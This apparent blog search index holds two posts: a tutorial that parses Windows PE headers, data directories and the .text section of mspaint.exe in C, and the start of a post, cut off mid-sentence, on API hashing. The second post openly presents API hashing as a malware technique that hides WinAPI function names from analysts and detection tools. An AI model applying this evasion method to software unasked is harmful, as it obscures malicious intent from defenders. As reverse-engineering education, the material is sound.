[{"content":"Intro In this post we will observe the fields a Portable Executable file (PE or also known as Image) has, how are they connected to each other and how can they be utilized to load addresses of functions, names of functions and ordinals - amongst other fields - by writing a program that reads and loads these parts of an executable. The executable we will be disassecting will be mspaint.exe.\nA few examples of files that have this PE format are files like .exe, .dll, .sys and .scr.\nAddress types Before proceeding, we need to provide some useful information about different type of addresses:\nRaw address: Raw address is an offset in the PE file. For example, PE[0x3C] will point to some other address. Base Address: Base Address is the actual address of where a PE file is loaded. Relative Virtual Addresses: Relative Virtual Addresses are relative to the base address of the PE. Instead of storing the actual address of each struct of the PE, we use a smaller address, known as RVA (Relative Virtual Address) which tells us \u0026ldquo;how far away\u0026rdquo; this address is from the base address. Virtual Address: Virtual address (VA) is the actual address where a field/struct is loaded in memory. Usually, when you print a pointer, you get back a VA. Based on the forementioned information, we can state the following computation equations:\nbaseAddress + RVA = VA RVA = VA - baseAddress PE structure The structure which presents the fields and parts that a PE file contains can be seen in the following simplified picture:\nEvery one of these parts is called header, and each header is defined by a structure which holds relevant information about the PE file.\nLet\u0026rsquo;s start breaking down each of these headers to get an idea of what they contain and what relation they have to each other.\nDOS Header DOS Header is the first header of a PE file, and its struct can be seen below:\ntypedef struct _IMAGE_DOS_HEADER { // DOS .EXE header WORD e_magic; // Magic number WORD e_cblp; // Bytes on last page of file WORD e_cp; // Pages in file WORD e_crlc; // Relocations WORD e_cparhdr; // Size of header in paragraphs WORD e_minalloc; // Minimum extra paragraphs needed WORD e_maxalloc; // Maximum extra paragraphs needed WORD e_ss; // Initial (relative) SS value WORD e_sp; // Initial SP value WORD e_csum; // Checksum WORD e_ip; // Initial IP value WORD e_cs; // Initial (relative) CS value WORD e_lfarlc; // File address of relocation table WORD e_ovno; // Overlay number WORD e_res[4]; // Reserved words WORD e_oemid; // OEM identifier (for e_oeminfo) WORD e_oeminfo; // OEM information; e_oemid specific WORD e_res2[10]; // Reserved words LONG e_lfanew; // Offset to the NT header } IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER; A few examples of how the DOS Header can be utilized is:\nChecking if the loaded file in memory is indeed an executable. We can check this via the e_magic field, which should always contain the known \u0026lsquo;MZ\u0026rsquo; header. All PE files start with these two bytes (0x5A4D = \u0026lsquo;MZ\u0026rsquo;). Using the e_lfanew field to jump to the NT Header we will see shortly. The e_lfanew field is an offset to the start of the NT Header. The e_lfanew is always located at an offset of 0x3C. We can view the DOS header struct of mspaint.exe by opening it in CFF Explorer:\nWe can verify our claims about the e_magic being 0x5A4D and e_lfanew being at offset 0x3C.\nAlso, we can see that the e_lfanew is a raw address to NT Header, as the PE[e_lfanew] = PE[0x3C] = 0xFB. If we view the offset of the NT Header at CFF explorer, we will evaluate this claim:\nDOS Stub Before proceeding to the NT Header, let\u0026rsquo;s first talk about DOS Stub. This stub is next to the DOS header and is not really relevant. It contains the popular message \u0026ldquo;This program cannot be run in DOS mode\u0026rdquo; which has remained over the years. The string can of course be modified at compile time. To clarify, this is not a header, but just a part of a PE file containing the prementioned string.\nNT Header The NT Header, apart from containing the signature of a PE file (\u0026ldquo;PE\u0026rdquo;), is useful as it incorporates two other important headers:\nthe FileHeader the OptionalHeader These headers contain a lot of important info regarding the PE as we will see going forward.\nNote\nTo land to the NT Header, we utilized the e_lfanew member of the DOS Header.\nGenerally, the struct of NT Header is the following:\ntypedef struct _IMAGE_NT_HEADERS { DWORD Signature; IMAGE_FILE_HEADER FileHeader; IMAGE_OPTIONAL_HEADER32 OptionalHeader; } IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32; for 32 bit systems, while for 64bit systems is the following:\ntypedef struct _IMAGE_NT_HEADERS64 { DWORD Signature; IMAGE_FILE_HEADER FileHeader; IMAGE_OPTIONAL_HEADER64 OptionalHeader; } IMAGE_NT_HEADERS64, *PIMAGE_NT_HEADERS64; Let\u0026rsquo;s now analyze the File Header and OptionalHeader to see what relevant/juicy information their members contain.\nFileHeader This header as stated previously can be accessed through the NT Header. It\u0026rsquo;s struct is the following:\ntypedef struct _IMAGE_FILE_HEADER { WORD Machine; WORD NumberOfSections; DWORD TimeDateStamp; DWORD PointerToSymbolTable; DWORD NumberOfSymbols; WORD SizeOfOptionalHeader; WORD Characteristics; } IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER; The most important members of this struct are:\nNumberOfSections: This contains the number of sections contained in the PE file. Characteristics: This contains Flags that specify attributes regarding the PE file such as whether it\u0026rsquo;s a DLL or console application. SizeOfOptionalHeader: This contains the size of the OptionalHeader. We can view the Characteristics of our PE by clicking on the corresponding field inside CFF Explorer:\nOptionalHeader This header is very important for the execution of a PE file. The word \u0026lsquo;Optional\u0026rsquo; might be misleading. It is named that way because some files (specifically, object files) do not have it.\nAs with the NT Header, the OptionalHeader has two versions depending on the system (32/64 bit). The only difference is that in the 32 bit systems, some struct members size is defined as DWORD while in 64 bit systems, the same members are defined as ULONGLONG:\ntypedef struct _IMAGE_OPTIONAL_HEADER64 { WORD Magic; BYTE MajorLinkerVersion; BYTE MinorLinkerVersion; DWORD SizeOfCode; DWORD SizeOfInitializedData; DWORD SizeOfUninitializedData; DWORD AddressOfEntryPoint; DWORD BaseOfCode; ULONGLONG / DWORD ImageBase; DWORD SectionAlignment; DWORD FileAlignment; WORD MajorOperatingSystemVersion; WORD MinorOperatingSystemVersion; WORD MajorImageVersion; WORD MinorImageVersion; WORD MajorSubsystemVersion; WORD MinorSubsystemVersion; DWORD Win32VersionValue; DWORD SizeOfImage; DWORD SizeOfHeaders; DWORD CheckSum; WORD Subsystem; WORD DllCharacteristics; ULONGLONG / DWORD SizeOfStackReserve; ULONGLONG / DWORD SizeOfStackCommit; ULONGLONG / DWORD SizeOfHeapReserve; ULONGLONG / DWORD SizeOfHeapCommit; DWORD LoaderFlags; DWORD NumberOfRvaAndSizes; IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES]; } IMAGE_OPTIONAL_HEADER64, *PIMAGE_OPTIONAL_HEADER64; The optional header contains a ton of information that can be used. Below are some of the struct members that are commonly used:\nMagic: Indicates the state of the image file (32-bit or 64-bit). SizeOfCode: The size of the .text section AddressOfEntryPoint: The offset to the file\u0026rsquo;s entry point (typically the main function). BaseOfCode: The offset to the beginning of the .text section. SizeOfImage: The total size of the image file in bytes. SizeOfHeaders: The total size of all the headers. DllCharacteristics: This includes various flags, the most useful being \u0026ldquo;DLL can move,\u0026rdquo; which indicates whether a module is ASLR-enabled (whether it can be relocated or not). ImageBase: Specifies the preferred memory address for loading the application when executed. However, due to Windows\u0026rsquo; memory protection mechanisms like Address Space Layout Randomization (ASLR), it is uncommon for an image to be loaded at its preferred address. The Windows PE Loader usually maps the file to a different address. This random allocation can cause issues in later techniques since some addresses, initially considered constant, are altered. The Windows PE loader will then perform PE relocation to correct these addresses. DataDirectory: This is one of the most crucial members in the optional header. It\u0026rsquo;s an array of IMAGE_DATA_DIRECTORY, containing the directories in a PE file (explained below). We can again view the mentioned fields with the help of CFF Explorer:\nHaving loaded the NT Header, we can parse the Optional Header and get some information regarding the PE. Some examples are:\nDWORD hdr_image_base = p_NT_HDR-\u0026gt;OptionalHeader.ImageBase; DWORD size_of_image = p_NT_HDR-\u0026gt;OptionalHeader.SizeOfImage; DWORD entry_point_RVA = p_NT_HDR-\u0026gt;OptionalHeader.AddressOfEntryPoint; DWORD size_of_headers = p_NT_HDR-\u0026gt;OptionalHeader.SizeOfHeaders; were p_NT_HDR the pointer to the NT Header.\nDataDirectory The Data Directory can be accessed from the OptionalHeader\u0026rsquo;s last member. It\u0026rsquo;s struct is the following:\ntypedef struct _IMAGE_DATA_DIRECTORY { DWORD VirtualAddress; DWORD Size; } IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY; The Data Directory array is of size IMAGE_NUMBEROF_DIRECTORY_ENTRIES which is a constant value of 15. Each element in the array represents a specific data directory which includes some data about a PE section or a Data Table (the place where specific information about the PE is saved).\nA specific data directory can be accessed using its index in the array:\n#define IMAGE_DIRECTORY_ENTRY_EXPORT 0 // Export Directory #define IMAGE_DIRECTORY_ENTRY_IMPORT 1 // Import Directory #define IMAGE_DIRECTORY_ENTRY_RESOURCE 2 // Resource Directory #define IMAGE_DIRECTORY_ENTRY_EXCEPTION 3 // Exception Directory #define IMAGE_DIRECTORY_ENTRY_SECURITY 4 // Security Directory #define IMAGE_DIRECTORY_ENTRY_BASERELOC 5 // Base Relocation Table #define IMAGE_DIRECTORY_ENTRY_DEBUG 6 // Debug Directory #define IMAGE_DIRECTORY_ENTRY_ARCHITECTURE 7 // Architecture Specific Data #define IMAGE_DIRECTORY_ENTRY_GLOBALPTR 8 // RVA of GP #define IMAGE_DIRECTORY_ENTRY_TLS 9 // TLS Directory #define IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG 10 // Load Configuration Directory #define IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT 11 // Bound Import Directory in headers #define IMAGE_DIRECTORY_ENTRY_IAT 12 // Import Address Table #define IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT 13 // Delay Load Import Descriptors #define IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR 14 // COM Runtime descriptor And through CFF Explorer:\nWe could also view this inside the winnt.h header file inside a visual studio project.\nThe following two sections will mention two of the most important data directories, the Export Directory and Import Address Table.\nExport Directory The Export Directory is a data structure that holds information about functions and variables exported from an executable. It includes the addresses of these exported functions and variables, allowing other executable files to access them. The export directory is typically found in DLLs that export functions, such as user32.dll exporting MessageBoxA. The Export Directory is also utilized in API Hashing to loop through all exported functions of a DLL.\nImport Address Table The Import Address Table is a data structure in a PE file that contains the addresses of functions imported from other executable files. These addresses are used to access the functions and data in the external executables, such as an application importing MessageBoxA from user32.dll.\nPE Sections The PE binary, as well as the memory once loaded, is divided into parts called sections. These sections contain the code and data needed to create an executable program. Each section is uniquely named and typically includes executable code, data, or resource information. The number of PE sections is not fixed, as different compilers can add, remove, or merge sections based on the configuration. Additionally, sections can be manually added later, making the structure dynamic. The IMAGE_FILE_HEADER.NumberOfSections helps determine the number of sections.\nThe following are the most important PE sections and are present in nearly every PE file:\n.text: Contains the executable code which is the written code. .data: Contains initialized data which are variables initialized in the code. .rdata: Contains read-only data. These are constant variables prefixed with const. .idata: Contains the import tables. These are tables of information related to the functions called using the code. This is used by the Windows PE Loader to determine which DLL files to load to the process, along with what functions are being used from each DLL. .reloc: Contains information on how to fix up memory addresses so that the program can be loaded into memory without any errors. .rsrc: Used to store resources such as icons and bitmaps. Each PE section has an associated IMAGE_SECTION_HEADER data structure that provides essential information about that section. These structures are stored beneath the NT headers in a PE file and are arranged sequentially, with each structure representing a different section:\nThe IMAGE_SECTION_HEADER structure is as follows:\ntypedef struct _IMAGE_SECTION_HEADER { BYTE Name[IMAGE_SIZEOF_SHORT_NAME]; union { DWORD PhysicalAddress; DWORD VirtualSize; } Misc; DWORD VirtualAddress; DWORD SizeOfRawData; DWORD PointerToRawData; DWORD PointerToRelocations; DWORD PointerToLinenumbers; WORD NumberOfRelocations; WORD NumberOfLinenumbers; DWORD Characteristics; } IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER; The ones that we must stand out here are:\nName: This is the name of the section (for example .text). PhysicalAddress, VirtualSize: The size of the section when it is loaded in memory. VirtualAddress: Offset of the start of the section in memory. Bringing it all together Now that we have some of the necessary theory covered, we can write a PoC program to print information regarding the DataDirectories after it has parsed the OptionalHeader, but also read through one of the sections, for example the .text one.\nPoC - Main Function We start off by specifying the full path of the program we want to read. After that, we utilize the fseek function to get the size of the mspaint PE file:\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;windows.h\u0026gt; #include \u0026lt;winnt.h\u0026gt; int main() { // Load the PE file data into memory FILE* file = fopen(\u0026#34;C:\\\\Windows\\\\System32\\\\mspaint.exe\u0026#34;, \u0026#34;rb\u0026#34;); if (!file) { printf(\u0026#34;Failed to open file.\\n\u0026#34;); return -1; } fseek(file, 0, SEEK_END); long fileSize = ftell(file); fseek(file, 0, SEEK_SET); As the comments describe, we basically \u0026ldquo;count\u0026rdquo; how many bytes there are from the start to the end of the executable. In a more in depth explanation:\nfseek(FILE *stream, long int offset, int whence): Its parameters can be described below: stream: A pointer to a FILE object that identifies the stream. offset: The number of bytes to offset from the position specified by whence. whence: The position from where the offset is added. It can take one of the following values: SEEK_SET: Beginning of the file. SEEK_CUR: Current position of the file pointer. SEEK_END: End of the file. ftell(exe_file): Returns the current value of the file position indicator, which is now at the end of the file because of the previous fseek call. This value represents the size of the file in bytes. Having computed the size of the executable, we go on to allocate the required memory for the exe plus an additional check to make sure everything went smoothly:\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;windows.h\u0026gt; #include \u0026lt;winnt.h\u0026gt; int main() { // Load the PE file data into memory FILE* file = fopen(\u0026#34;C:\\\\Windows\\\\System32\\\\mspaint.exe\u0026#34;, \u0026#34;rb\u0026#34;); if (!file) { printf(\u0026#34;Failed to open file.\\n\u0026#34;); return -1; } fseek(file, 0, SEEK_END); long fileSize = ftell(file); fseek(file, 0, SEEK_SET); char* buffer = (char*)malloc(fileSize+1); if (!buffer) { printf(\u0026#34;Memory allocation failed.\\n\u0026#34;); fclose(file); return -1; } size_t n_read = fread(buffer, 1, fileSize, file); if(n_read != fileSize) { printf(\u0026#34;reading error (%d)\\n\u0026#34;, n_read); return 1; } fclose(file); The malloc allocates a block of memory large enough to hold the entire file plus one additional byte. The additional byte can be used to null-terminate the data if needed (e.g., if the data is to be treated as a string).\nThe fread(void *ptr, size_t size, size_t nmemb, FILE *stream) just reads the *stream file - in our case the exe - to the malloc section previously defined. It will read nmemb bytes which is the size of the exe and the size of each element to be read in bytes is 1 byte.\nThe fread returns size, so if the size read into buffer is not the same as the previously computed fileSize (the size of the exe) then something went wrong and we exit. If the sizes are the same, then we can proceed:\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;windows.h\u0026gt; #include \u0026lt;winnt.h\u0026gt; int main() { // Load the PE file data into memory FILE* file = fopen(\u0026#34;C:\\\\Windows\\\\System32\\\\mspaint.exe\u0026#34;, \u0026#34;rb\u0026#34;); if (!file) { printf(\u0026#34;Failed to open file.\\n\u0026#34;); return -1; } fseek(file, 0, SEEK_END); long fileSize = ftell(file); fseek(file, 0, SEEK_SET); char* buffer = (char*)malloc(fileSize+1); if (!buffer) { printf(\u0026#34;Memory allocation failed.\\n\u0026#34;); fclose(file); return -1; } size_t n_read = fread(buffer, 1, fileSize, file); if(n_read != fileSize) { printf(\u0026#34;reading error (%d)\\n\u0026#34;, n_read); return 1; } fclose(file); // Load the PE file load_PE(buffer); free(buffer); return 0; } The code continues by calling the function load_PE(buffer) that will be responsible for loading all the sections of the PE File, eventually landing at the functions it uses. Let\u0026rsquo;s start developing it.\nPoC - load_PE function Now that we have completed the main function, we will start developing the load_PE function which is the one that will enumerate and parse through the PE file, eventually providing us with the juicy information we aim at.\nIMAGE_DOS_HEADER void* load_PE(char* PE_data) { PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)PE_data; if (pImgDosHdr-\u0026gt;e_magic != IMAGE_DOS_SIGNATURE) return NULL; // more } We pass the PE_data which is a pointer to the address of the PE file we previously read to a buffer. We cast to (PIMAGE_DOS_HEADER) in order to tell VS code how these bytes actually look like at that address, since they represend and contain members of a PE file.\nAfter the cast to (PIMAGE_DOS_HEADER), we access the e_magic field (\u0026lsquo;MZ\u0026rsquo;) to see if it is a valid executable. The IMAGE_DOS_SIGNATURE is hardcoded to \u0026lsquo;MZ\u0026rsquo;, so before our code proceeds further, we need to make sure the data we passed to the function is a valid PE file.\nIMAGE_NT_HEADER After the first check is successful, we continue by accessing the NT_HEADER:\nvoid* load_PE(char* PE_data) { PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)PE_data; if (pImgDosHdr-\u0026gt;e_magic != IMAGE_DOS_SIGNATURE) return NULL; PIMAGE_NT_HEADERS pImgNtHdrs = (PIMAGE_NT_HEADERS)(PE_data + pImgDosHdr-\u0026gt;e_lfanew); if (pImgNtHdrs-\u0026gt;Signature != IMAGE_NT_SIGNATURE) return NULL; // more } As we previously discussed, using the baseAddress of a PE in combination with the e_lfanew member of the PIMAGE_DOS_HEADER struct, we can access the NT Header. The PE_data used here is not the actual bytes of the PE file but rather a pointer to the address were the data are stored (the starting address of the previously read PE).\nAfter we have accessed the NT Header, we make a check to see if the Signature member that is supposed to exist after the casting to (PIMAGE_NT_HEADERS) is equal to the hardcoded IMAGE_NT_SIGNATURE value of 'PE'. This is just an extra check to make sure we are working with a valid PE file.\nOptional Header \u0026amp; DataDirectories Passing this check, we then access the OptionalHeader member of the NT Header. The reason we do this is to access the Data Directories and its members since the OptionalHeader is the one containing this info, as discussed previously:\nvoid* load_PE(char* PE_data) { PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)PE_data; if (pImgDosHdr-\u0026gt;e_magic != IMAGE_DOS_SIGNATURE) return NULL; printf(\u0026#34;PE_data is %p\u0026#34;, PE_data); return 0; PIMAGE_NT_HEADERS pImgNtHdrs = (PIMAGE_NT_HEADERS)(PE_data + pImgDosHdr-\u0026gt;e_lfanew); if (pImgNtHdrs-\u0026gt;Signature != IMAGE_NT_SIGNATURE) return NULL; IMAGE_OPTIONAL_HEADER ImgOptHdr = pImgNtHdrs-\u0026gt;OptionalHeader; // Iterate over the DataDirectory entries (15 in total) for (int i = 0; i \u0026lt; IMAGE_NUMBEROF_DIRECTORY_ENTRIES; ++i) { IMAGE_DATA_DIRECTORY dataDirectory = ImgOptHdr.DataDirectory[i]; printf(\u0026#34;DataDirectory %d:\\n\u0026#34;, i); printf(\u0026#34; Value at Virtual Address (RVA): 0x%08lx\\n\u0026#34;, dataDirectory.VirtualAddress); // Print the RVA printf(\u0026#34; Size: 0x%08lx\\n\u0026#34;, dataDirectory.Size); // Calculate the address in the PE data if (dataDirectory.VirtualAddress != 0) { void* directoryAddress = PE_data + dataDirectory.VirtualAddress; printf(\u0026#34; Virtual Address: %p\\n\u0026#34;, directoryAddress); } else { printf(\u0026#34; No data at this directory entry.\\n\u0026#34;); } } // more Inside the loop, we store the current Data Directory at each loop to a variable of type IMAGE_DATA_DIRECTORY and then proceed to access its two members (VirtualAddress and Size).\nWe also try and get the VA of the directory by adding the base address of the PE with the Virtual address of the current dataDir. If there are any data stored in there, we print the address we calculated.\nFor anyone wondering what data can be inside the calculated address, if we had passed a DLL with exported functions to the load_PE function, then inside the EXPORT DIRECTORY there would be information about addresses of functions, addresses of names - amongst other members. See API Hashing for more.\n.text section Finally, we load the data stored in the .text section, printing its relevant information such as pointers to addresses, as well as the raw bytes it contains:\nvoid* load_PE(char* PE_data) { PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)PE_data; if (pImgDosHdr-\u0026gt;e_magic != IMAGE_DOS_SIGNATURE) return NULL; PIMAGE_NT_HEADERS pImgNtHdrs = (PIMAGE_NT_HEADERS)(PE_data + pImgDosHdr-\u0026gt;e_lfanew); if (pImgNtHdrs-\u0026gt;Signature != IMAGE_NT_SIGNATURE) return NULL; IMAGE_OPTIONAL_HEADER ImgOptHdr = pImgNtHdrs-\u0026gt;OptionalHeader; // Iterate over the DataDirectory entries (15 in total) for (int i = 0; i \u0026lt; IMAGE_NUMBEROF_DIRECTORY_ENTRIES; ++i) { IMAGE_DATA_DIRECTORY dataDirectory = ImgOptHdr.DataDirectory[i]; printf(\u0026#34;DataDirectory %d:\\n\u0026#34;, i); printf(\u0026#34; Value at Virtual Address (RVA): 0x%08lx\\n\u0026#34;, dataDirectory.VirtualAddress); // Print the RVA printf(\u0026#34; Size: 0x%08lx\\n\u0026#34;, dataDirectory.Size); // Calculate the address in the PE data if (dataDirectory.VirtualAddress != 0) { void* directoryAddress = PE_data + dataDirectory.VirtualAddress; printf(\u0026#34; Virtual Address: %p\\n\u0026#34;, directoryAddress); } else { printf(\u0026#34; No data at this directory entry.\\n\u0026#34;); } } // Find and read the .text section as a PoC PIMAGE_SECTION_HEADER sectionHeader = IMAGE_FIRST_SECTION(pImgNtHdrs); for (int i = 0; i \u0026lt; pImgNtHdrs-\u0026gt;FileHeader.NumberOfSections; i++) { if (strncmp((char*)sectionHeader-\u0026gt;Name, \u0026#34;.text\u0026#34;, 5) == 0) { printf(\u0026#34;.text section found.\\n\u0026#34;); printf(\u0026#34; Virtual Address: 0x%08lx\\n\u0026#34;, sectionHeader-\u0026gt;VirtualAddress); printf(\u0026#34; Size of Raw Data: 0x%08lx\\n\u0026#34;, sectionHeader-\u0026gt;SizeOfRawData); printf(\u0026#34; Pointer to Raw Data: 0x%08lx\\n\u0026#34;, sectionHeader-\u0026gt;PointerToRawData); // Read the contents of the .text section char* textSectionData = (char*)malloc(sectionHeader-\u0026gt;SizeOfRawData); if (!textSectionData) { printf(\u0026#34;Memory allocation failed for .text section data.\\n\u0026#34;); return NULL; } memcpy(textSectionData, PE_data + sectionHeader-\u0026gt;PointerToRawData, sectionHeader-\u0026gt;SizeOfRawData); // Print the contents of the .text section for (DWORD j = 0; j \u0026lt; sectionHeader-\u0026gt;SizeOfRawData; j++) { printf(\u0026#34;%02x \u0026#34;, (unsigned char)textSectionData[j]); } printf(\u0026#34;\\n\u0026#34;); free(textSectionData); break; } sectionHeader++; } return NULL; } We first use the IMAGE_FIRST_SECTION to get the first section of the NT Header.\nThen, we enumerate through all its sections and compare the first 5 characters of each one to \u0026ldquo;.text\u0026rdquo;. If we have a match, then we have landed on the .text section.\nHaving the correct section, we print its Virtual Address, the Size of its Raw Data and the Pointer to the Raw Data.\nThen, since we want to read the contents of the section, we allocate the right memory space with malloc, based on the previously printed SizeOfRawData member and then copy the bytes to the textSectionData buffer with memcpy.\nAfter the copy of the bytes to the textSectionData buffer, we enumerate through each byte and print it. After completing the enumeration of the bytes, we free the buffer.\nRunning the final program Putting it all together, we are met with the following code:\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;windows.h\u0026gt; #include \u0026lt;winnt.h\u0026gt; void* load_PE(char* PE_data) { PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)PE_data; if (pImgDosHdr-\u0026gt;e_magic != IMAGE_DOS_SIGNATURE) return NULL; PIMAGE_NT_HEADERS pImgNtHdrs = (PIMAGE_NT_HEADERS)(PE_data + pImgDosHdr-\u0026gt;e_lfanew); if (pImgNtHdrs-\u0026gt;Signature != IMAGE_NT_SIGNATURE) return NULL; IMAGE_OPTIONAL_HEADER ImgOptHdr = pImgNtHdrs-\u0026gt;OptionalHeader; // Iterate over the DataDirectory entries (15 in total) for (int i = 0; i \u0026lt; IMAGE_NUMBEROF_DIRECTORY_ENTRIES; ++i) { IMAGE_DATA_DIRECTORY dataDirectory = ImgOptHdr.DataDirectory[i]; printf(\u0026#34;DataDirectory %d:\\n\u0026#34;, i); printf(\u0026#34; Value at Virtual Address (RVA): 0x%08lx\\n\u0026#34;, dataDirectory.VirtualAddress); // Print the RVA printf(\u0026#34; Size: 0x%08lx\\n\u0026#34;, dataDirectory.Size); // Calculate the address in the PE data if (dataDirectory.VirtualAddress != 0) { void* directoryAddress = PE_data + dataDirectory.VirtualAddress; printf(\u0026#34; Virtual Address: %p\\n\u0026#34;, directoryAddress); } else { printf(\u0026#34; No data at this directory entry.\\n\u0026#34;); } } // Find and read the .text section as a PoC PIMAGE_SECTION_HEADER sectionHeader = IMAGE_FIRST_SECTION(pImgNtHdrs); for (int i = 0; i \u0026lt; pImgNtHdrs-\u0026gt;FileHeader.NumberOfSections; i++) { if (strncmp((char*)sectionHeader-\u0026gt;Name, \u0026#34;.text\u0026#34;, 5) == 0) { printf(\u0026#34;.text section found.\\n\u0026#34;); printf(\u0026#34; Virtual Address: 0x%08lx\\n\u0026#34;, sectionHeader-\u0026gt;VirtualAddress); printf(\u0026#34; Size of Raw Data: 0x%08lx\\n\u0026#34;, sectionHeader-\u0026gt;SizeOfRawData); printf(\u0026#34; Pointer to Raw Data: 0x%08lx\\n\u0026#34;, sectionHeader-\u0026gt;PointerToRawData); // Read the contents of the .text section char* textSectionData = (char*)malloc(sectionHeader-\u0026gt;SizeOfRawData); if (!textSectionData) { printf(\u0026#34;Memory allocation failed for .text section data.\\n\u0026#34;); return NULL; } memcpy(textSectionData, PE_data + sectionHeader-\u0026gt;PointerToRawData, sectionHeader-\u0026gt;SizeOfRawData); // Print the contents of the .text section for (DWORD j = 0; j \u0026lt; sectionHeader-\u0026gt;SizeOfRawData; j++) { printf(\u0026#34;%02x \u0026#34;, (unsigned char)textSectionData[j]); } printf(\u0026#34;\\n\u0026#34;); free(textSectionData); break; } sectionHeader++; } return NULL; } int main() { // Load the PE file data into memory FILE* file = fopen(\u0026#34;C:\\\\Windows\\\\System32\\\\mspaint.exe\u0026#34;, \u0026#34;rb\u0026#34;); if (!file) { printf(\u0026#34;Failed to open file.\\n\u0026#34;); return -1; } fseek(file, 0, SEEK_END); long fileSize = ftell(file); fseek(file, 0, SEEK_SET); char* buffer = (char*)malloc(fileSize + 1); if (!buffer) { printf(\u0026#34;Memory allocation failed.\\n\u0026#34;); fclose(file); return -1; } size_t n_read = fread(buffer, 1, fileSize, file); if (n_read != fileSize) { printf(\u0026#34;reading error (%d)\\n\u0026#34;, n_read); return 1; } fclose(file); // Load the PE file load_PE(buffer); free(buffer); return 0; } Let\u0026rsquo;s run it and evaluate the results regarding the Data Directories and the .text section:\nObserving the output, we see we have gotten the correct values compared side by side with CFF explorer. Let\u0026rsquo;s navigate to the Section Headers and click on the .text one:\nWe have successfully evaluated that our code works correctly!\nSumming up In this post we loaded a PE file, navigated through its headers and got the information we initially targeted for. The following picture really helps you to remember what to aim for and how to move around inside the PE:\nSo this program was a simple PoC to see how you can move around the headers and how to actually access them. On a more abstruct depiction, our code did the following:\nAddress of Names added only as a reference to a previous statement I made regarding the Export Directory.\nReferences\n[1] WireDiver: Writing a PE packer – Part 1 : load a PE in memory\r[2] wireless90: Exploring the Export Table [Windows PE Internals]\r","permalink":"http://localhost:1313/posts/insideapefile/","summary":"\u003ch2 id=\"intro\"\u003eIntro\u003c/h2\u003e\n\u003cp\u003eIn this post we will observe the fields a Portable Executable file (PE or also known as Image) has, how are they connected to each other and how can they be utilized to load addresses of functions, names of functions and ordinals - amongst other fields - by writing a program that reads and loads these parts of an executable. The executable we will be disassecting will be mspaint.exe.\u003c/p\u003e","title":"Inside a PE file"},{"content":"Intro As mentioned in the Exploring PEB struct and its fields post, we will now see how to to use a technique known as API Hashing. API hashing is a technique used in malware to identify API functions by their hash value from their names or other attributes. This hash value can then be used instead of the function names or other attributes to enumerate, rehash, compare and use functions based on the hash value. This way, direct calls by function names is avoided and thus leads to fewer detection rates. More specifically, it is used to make the work of analysts harder since names of WINAPI functions or DLL\u0026rsquo;s won\u0026rsquo;t show in string commands or tools like CFF Explorer, so the intentions of the executable won\u0026rsquo;t be so clear from the beginning.\nHow it works A hash function is applied to the API function name. For example, a simple hash function might take the string CreateFileA and produce a hash value such as 0xA1B2C3D4. It will then load all loaded functions of the desired DLL, hash them and compare the result with the target hash. If there is a match, a handle to this address will be returned and invoked through a custom defined structure of the desired function.\nExamples Let\u0026rsquo;s preview the final result of the application of this technique to an executable that simple uses MessageBox to show a message on the screen. Running the program before this technique would showcase this:\nLoading the same exe to CFF explorer, we see it uses USER32DLL to utilize the MessageBox function:\nNow, let\u0026rsquo;s observe the output of the same program but modified into using API Hashing instead:\nAnd again, loading to CFF explorer, wee see that indeed the USER32.DLL has disappeared:\nRuntime Resolution When the program runs, it will compare the hash values of available API functions with the precomputed hash values. When a match is found, the corresponding function is called, thus avoiding the direct call (hardcoded use) of the name.\nIn the following code that will be showcased, we will break down how to find all the functions inside a given DLL and loop through them until we get a hit for a hash value comparison. The hash we will be comparing with will be that of the MessageBoxA, and when the match will be found, we will call this function.\nCode We will explain one part at a time, slowly building up the code that will execute a MessageBoxA function without using the direct name.\nChecking for DLL argument The executable will take as argument the DLL that we want the MessageBoxA function from, and specifically the user32.dll. So our code starts by checking if an argument has been given and if so, it stores it in a variable:\nint main(int argc, wchar_t* argv[]) { if (argc != 2) { wprintf(L\u0026#34;Usage: %s \u0026lt;target_dll_name\u0026gt;\\n\u0026#34;, argv[0]); return 1; } // Get the DLL passed as argument, for example user32.dll wchar_t* targetDllName = argv[1]; /* -- more -- */ } Loading the DLL in memory After the Dll argument has been given, we check with GetModuleHandleA if the DLL is already loaded in memory. If not, GetModuleHandleA will have returned NULL and so we will use LoadLibraryA to load this DLL in memory:\nint main(int argc, wchar_t* argv[]) { if (argc != 2) { wprintf(L\u0026#34;Usage: %s \u0026lt;target_dll_name\u0026gt;\\n\u0026#34;, argv[0]); return 1; } // Get the DLL passed as argument, for example user32.dll wchar_t* targetDllName = argv[1]; // Get a handle for this dll HMODULE hModule_of_arg_dll = GetModuleHandleA((LPCSTR)targetDllName); // If it is not loaded in memory, load it now if (hModule_of_arg_dll == NULL) { hModule_of_arg_dll = LoadLibraryA(targetDllName); } } We cast the targetDllName to (LPCSTR) since the GetModuleHandleA accepts this type of parameter:\nGetModuleHandleA( _In_opt_ LPCSTR lpModuleName ); We can always CTRL+click on the function\u0026rsquo;s name to see its definition and type parameters.\nAPI Hashing - Finding the function via hash Now this is the part of the juicy code that enumerates through all the DLL\u0026rsquo;s functions and searches for a hash match. In this code, we pre-computed the hash value of the MessageBoxA function of user32.dll. So we basically pass the user32.dll as parameter to the program, and then program tries to find a match of a function inside user32.dll whose hash is 